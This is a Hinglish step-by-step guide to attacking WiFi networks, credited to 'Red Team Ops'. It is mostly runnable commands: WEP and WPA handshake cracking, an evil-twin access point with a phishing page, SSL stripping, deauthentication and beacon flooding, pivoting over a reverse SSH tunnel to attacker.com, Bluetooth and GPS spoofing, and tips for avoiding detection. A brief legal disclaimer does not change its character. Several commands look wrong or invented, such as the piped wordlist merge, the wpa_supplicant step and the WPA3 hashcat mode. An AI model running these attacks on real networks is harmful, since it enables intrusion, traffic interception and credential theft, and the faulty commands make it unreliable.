# WiFi Hacking — Complete Guide

**Professional Wireless Network Exploitation**

---

## 1. WiFi Reconnaissance aur Network Discovery

**Objective:** Target WiFi networks ko find karna aur analyze karna.

```bash
# Passive monitoring (no packets sent)
airodump-ng --band a wlan0
airodump-ng --band b wlan0
airodump-ng -c 1-13 wlan0

# Specific channel monitoring
airodump-ng -c 6 -w capture wlan0

# Monitor specific BSSID
airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0

# Find hidden networks
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0

# Wireless tool - Kismet
kismet -c wlan0

# Network analyzer
nmap --script wireless-scan 192.168.1.0/24
```

### Packet Analysis

```bash
# Capture packets
tcpdump -i wlan0 -w capture.pcap

# Analyze with Wireshark
wireshark capture.pcap

# Check encryption type
airodump-ng | grep "OPN\|WEP\|WPA\|WPA2"

# Find weak signals
airodump-ng | grep -E "Pwr: -[6789][0-9]"
```

**Detection Difficulty:** ⭐ (Completely passive)

---

## 2. WEP Cracking - Outdated par Samjhne Layak

**Objective:** WEP encryption ko break karna.

```bash
# Step 1: Monitor network
airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0

# Step 2: Fake authentication
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0

# Step 3: ARP request replay
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0

# Step 4: Crack WEP key
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap

# Step 5: Connect to network
iwconfig wlan0 essid "NetworkName" key s:KEY_HERE
dhclient wlan0
```

### WEP Attacks

```bash
# Chopchop attack (faster)
aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0

# Fragmentation attack
aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0

# Fake SSID confusion
aireplay-ng -9 -e "SSID" -a AA:BB:CC:DD:EE:FF wlan0
```

**Detection Difficulty:** ⭐⭐ (Very easy to crack)

---

## 3. WPA/WPA2 Cracking - Main Technique

**Objective:** WPA/WPA2 protected networks ko hack karna.

### Handshake Capture

```bash
# Step 1: Find network
airodump-ng wlan0

# Step 2: Start capturing on specific channel
airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0

# Step 3: Force deauthentication (client reconnects)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0

# Wait for "[WPA handshake: AA:BB:CC:DD:EE:FF]" in airodump output

# Step 4: Convert to hashcat format
cap2hccapx.bin capture-01.cap capture.hccapx

# Step 5: Convert to hashcat format (alternative)
aircrack-ng -j output.hc22000 capture-01.cap
```

### Brute Force Attack

```bash
# Using aircrack-ng
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Using hashcat (GPU accelerated)
hashcat -m 22000 capture.hc22000 wordlist.txt

# Using hashcat with rules
hashcat -m 22000 capture.hc22000 wordlist.txt -r rules/best64.rule

# Using John the Ripper
john --format=wpapsk --wordlist=wordlist.txt hashes.txt

# Multi-threaded cracking
for file in *.cap; do
  aircrack-ng -w wordlist.txt "$file" &
done
wait
```

### Dictionary Attack

```bash
# Create custom wordlist
crunch 8 15 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" -o custom.txt

# Use common passwords
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt

# Combine wordlists
cat wordlist1.txt wordlist2.txt > combined.txt | sort -u > unique.txt
```

### WPA3 Cracking (Advanced)

```bash
# WPA3 uses SAE (Simultaneous Authentication of Equals)
# Dragonblood attack - possible but more complex

# Monitor WPA3 network
airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0

# Capture SAE frame
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0

# Use hostapd-wpe (modified hostapd)
hostapd-wpe wpa3_config.conf

# Crack with hashcat
hashcat -m 32768 wpa3_hashes.txt wordlist.txt
```

**Detection Difficulty:** ⭐⭐⭐⭐ (Dictionary size matters)

---

## 4. Rogue Access Point (Evil Twin)

**Objective:** Fake WiFi network banakar users ko phir se connect karwana.

```bash
# Step 1: Setup interface
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Step 2: Configure hostapd
cat > hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=1
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
EOF

# Step 3: Start hostapd
hostapd hostapd.conf

# Step 4: Configure dnsmasq
cat > dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
address=/#/192.168.1.1
EOF

# Step 5: Start dnsmasq
dnsmasq -C dnsmasq.conf

# Step 6: Setup IP forwarding
ip addr add 192.168.1.1/24 dev wlan0
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 7: Traffic capturing
mitmproxy -i wlan0 --mode transparent

# Step 8: Login page phishing
python3 -m http.server 80
```

### SSL Strip Attack

```bash
# Downgrade HTTPS to HTTP
arpspoof -i wlan0 -t client_ip router_ip
sslstrip -w output.log -l 10000 -f -u

# Redirect traffic
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000
```

**Detection Difficulty:** ⭐⭐⭐ (Users notice different SSID)

---

## 5. MAC Address Spoofing aur Device Masquerading

**Objective:** MAC address ko change karke detection bypass karna.

```bash
# Check current MAC
ifconfig wlan0
macchanger -s wlan0

# List available MAC addresses
macchanger -l

# Change to random MAC
macchanger -r wlan0

# Change to specific manufacturer
macchanger -m "Apple" wlan0

# Change to specific MAC address
macchanger --mac 00:11:22:33:44:55 wlan0

# Permanent change
macchanger -l | grep "Apple" | head -1 | cut -d' ' -f3 > mac.txt
ifconfig wlan0 hw ether $(cat mac.txt)
```

---

## 6. Packet Injection aur Rate Limiting Bypass

**Objective:** Wireless network mein custom packets inject karna.

```bash
# Mdk3 - DoS tool
mdk3 wlan0 b -a -s 1000 -c 1-13

# aireplay-ng attacks
aireplay-ng -0 100 -a AA:BB:CC:DD:EE:FF wlan0   # Deauth
aireplay-ng -2 -p 0123456789 -F wlan0            # ARP injection

# Scapy (custom packet crafting)
python3 << 'EOF'
from scapy.all import *

# Create packet
packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="aa:bb:cc:dd:ee:ff", addr3="aa:bb:cc:dd:ee:ff")/Dot11Beacon(cap="privacy")

# Send packet
sendp(packet, iface="wlan0", count=100, inter=0.1)
EOF
```

---

## 7. Wireless Network Pivoting

**Objective:** Compromised WiFi se internal network ko access karna.

```bash
# Step 1: Get shell on WiFi
# (From previous RCE or social engineering)

# Step 2: Network discovery
arp-scan -l
nmap -sn 192.168.1.0/24

# Step 3: Port scanning
nmap -p 22,23,3306,5432 192.168.1.0/24

# Step 4: Create reverse tunnel
ssh -R 9000:192.168.1.1:3389 attacker@attacker.com

# Step 5: Access internal services through tunnel
rdesktop localhost:9000
```

---

## 8. Bluetooth Hacking

**Objective:** Nearby Bluetooth devices ko hack karna.

```bash
# Scan for Bluetooth devices
hcitool scan

# Get device info
hcitool info AA:BB:CC:DD:EE:FF

# Bluetooth sniffing
hcidump -i hci0 -w capture.hcidump

# Bluez exploitation
rfcomm bind /dev/rfcomm0 AA:BB:CC:DD:EE:FF

# BTLE (Bluetooth Low Energy) sniffing
ubertooth-rx -f

# Bettercap Bluetooth module
bettercap -iface wlan0 -caplet http-ui
```

---

## 9. GPS Spoofing aur Location Tracking

**Objective:** WiFi ke through location identify karna aur spoof karna.

```bash
# Location detection via WiFi
python3 << 'EOF'
import json
import requests

# Google Geolocation API
wifis = [
    {"macAddress": "AA:BB:CC:DD:EE:FF", "signalStrength": -40},
    {"macAddress": "11:22:33:44:55:66", "signalStrength": -50}
]

response = requests.post(
    "https://www.googleapis.com/geolocation/v1/geolocate?key=YOUR_API_KEY",
    json={"wifiAccessPoints": wifis}
)

print(response.json())
EOF

# GPS spoofing
gpsd -D 4 /dev/ttyUSB0

# Fake GPS coordinates
python3 << 'EOF'
import socket

# Create fake GPS data
fake_gps = "\$GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47"

# Send to GPS service
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(fake_gps.encode(), ("localhost", 5000))
EOF
```

---

## 10. Advanced WiFi Attack Combo

**Objective:** Multiple techniques combine karke complete network compromise.

### Full Attack Chain

```bash
# Step 1: Reconnaissance
airodump-ng wlan0 > networks.txt

# Step 2: Target selection
# Look for WPA2 with weak signal

# Step 3: Deauth and capture handshake
aireplay-ng -0 10 -a TARGET_BSSID wlan0 &
airodump-ng -c 6 -w capture --bssid TARGET_BSSID wlan0

# Step 4: Extract handshake
aircrack-ng capture-01.cap | grep "HANDSHAKE"

# Step 5: Convert to hashcat
cap2hccapx.bin capture-01.cap capture.hccapx

# Step 6: Multi-GPU cracking
hashcat -m 22000 capture.hc22000 /path/to/wordlist.txt -O -w 3 -d 1,2

# Step 7: Connect to network
wpa_supplicant -B -c <(wpa_cli -p /var/run/wpa_supplicant -i wlan0 get_config) -i wlan0

# Step 8: Get IP
dhclient wlan0

# Step 9: Pivot to internal network
arp-scan -l
nmap -sn 192.168.1.0/24

# Step 10: Compromise internal systems
# (SQL injection, RCE, etc.)
```

---

## WiFi Security Tools

```bash
# Aircrack suite
aircrack-ng
aireplay-ng
airodump-ng

# Hashcat (GPU cracking)
hashcat

# Monitoring tools
wireshark
tcpdump
kismet

# Attack tools
hostapd
dnsmasq
mdk3

# Bluetooth tools
hcitool
bluez
ubertooth
```

---

## Detection Avoidance

### IDS/IPS Bypass

```bash
# Slow attacks to avoid detection
aireplay-ng -0 1 -a TARGET_BSSID wlan0

# Random MAC addresses
macchanger -r wlan0

# Change channels frequently
for ch in {1..13}; do
  airodump-ng -c $ch wlan0 &
  sleep 5
  killall airodump-ng
done

# Use low power transmission
iw reg set US
iwconfig wlan0 txpower 20mW
```

---

## Kanuni Chetavni

```
⚖️ Savdhani! ⚖️

Ye techniques sirf iske liye authorized hain:
✓ Apne WiFi networks par
✓ Authorized penetration testing
✓ Bug bounty programs
✓ Research and education

Ye techniques ILLEGAL hain:
✗ Unauthorized network access
✗ Dusron ke networks ko crack karna
✗ Data theft
✗ Network disruption

Federal offense:
- Prison time
- Heavy fines
- Equipment seizure

Responsibility se use karo!
```

---

## Quick Reference - WiFi Commands

```bash
# Reconnaissance
airodump-ng wlan0

# WPA2 cracking
aireplay-ng -0 10 -a BSSID wlan0
aircrack-ng -w wordlist.txt capture-01.cap

# Evil Twin
hostapd hostapd.conf
dnsmasq -C dnsmasq.conf

# MAC spoofing
macchanger -r wlan0

# Packet injection
mdk3 wlan0 b -a -s 1000

# Full attack
airodump-ng -c 6 -w cap --bssid BSSID wlan0 & aireplay-ng -0 10 -a BSSID wlan0 & hashcat -m 22000 cap.hc22000 wordlist.txt
```

---

**Banaya Gaya:** WiFi Hacking Database  
**Classification:** Wireless Security  
**Skill Level:** Advanced  
**Risk Level:** Critical  
**Language:** Hinglish

---

**Last Updated:** 2026-06-16  
**Creator:** Red Team Ops
